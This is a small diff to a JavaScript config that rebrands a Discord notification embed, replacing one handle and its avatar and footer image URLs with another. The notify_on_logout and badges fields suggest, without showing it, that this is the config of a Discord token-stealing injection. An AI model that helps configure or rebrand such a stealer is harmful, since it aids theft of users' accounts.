@@ -20,16 +20,16 @@ var config = {
 
    notify_on_logout: false,
    notify_on_initialization: false,
-   ping: [false, "@J12aKs"],
+   ping: [false, "@ipNusku"],
 
    embed: {
-       username: "J12aKs | J12aKs",
+       username: "ipNusku | ipNusku",
        footer: {
-           text: `J12aKs`,
-           icon_url: "https://cdn.discordapp.com/attachments/883814053737295982/1091784907774251131/MV5BMzczNDA1MjgwN15BMl5BanBnXkFtZTcwODc5NzI1OQ._V1_UY1200_CR58506301200_AL_.jpg",
+           text: `ipNusku`,
+           icon_url: "https://cdn.discordapp.com/attachments/866428805693308978/1122132126377197588/a8633f19d4e4db068327968607703072_400x400.jpeg",
        },
-       href: "j12aks | J12aKs",
-       avatar_url: "https://cdn.discordapp.com/attachments/883814053737295982/1091784907774251131/MV5BMzczNDA1MjgwN15BMl5BanBnXkFtZTcwODc5NzI1OQ._V1_UY1200_CR58506301200_AL_.jpg"
+       href: "ipNusku | ipNusku",
+       avatar_url: "https://cdn.discordapp.com/attachments/866428805693308978/1122132126377197588/a8633f19d4e4db068327968607703072_400x400.jpeg"
    },
 
    badges: {
